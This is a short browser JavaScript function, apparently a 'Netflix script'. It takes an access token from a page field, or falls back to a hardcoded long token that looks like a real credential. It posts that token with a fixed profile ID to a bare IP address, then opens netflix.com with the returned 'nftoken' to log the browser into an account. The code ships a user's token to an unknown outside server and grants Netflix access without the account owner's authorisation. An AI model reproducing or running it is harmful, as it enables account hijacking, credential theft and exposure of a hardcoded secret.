function runNetflixScript() {
    let access_token = document.getElementById("access-token-input").value;
    if (!access_token) {
        access_token = "EAAFE0Tw8WfwBAE8JK8DL98ZCgZAliUiF6eGzERcbbDAL6XqOM7zZCh2w6IKvsuPS1viv5MkZAaWkyuEUtZAucCjsgwD34OU1gFwoZAqJ4NO0vdLYbvmwjIx2PAFwgkt41ERJpoaa51gkgHLaTKp2bhzs9O6EGfWq3tkZB6GZBzLcWWpUsZAUJ8WBjra2UYYeSX0rsyIDFbaZAMQpJYIf3OZBDLu"; // set a default access token
    }
    
    const NETFLIX_DOMAIN = "http://www.netflix.com/";
    const url = "https://65.21.228.155/access";
    const headers = {
      "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    };
    const data = { access_token: access_token, profile_id: "100004323155386" };
  
    fetch(url, {
      method: "POST",
      headers: headers,
      body: new URLSearchParams(data),
    })
      .then((response) => {
        if (response.ok) {
          response.json().then((data) => {
            const nftoken = data.data.NFToken;
            const link = NETFLIX_DOMAIN + "?nftoken=" + nftoken;
            console.log(link);
            document.getElementById("netflix-button").style.backgroundColor =
              "green";
            window.open(link);
                            window.location.href = (NETFLIX_DOMAIN + '?nftoken=' + data.data.NFToken);
          });
        } else {
          console.log("Error:", response.status);
          document.getElementById("netflix-button").style.backgroundColor =
            "red";
        }
      })
      .catch((error) => {
        console.log("Error:", error);
        document.getElementById("netflix-button").style.backgroundColor = "red";
      });
  }
  
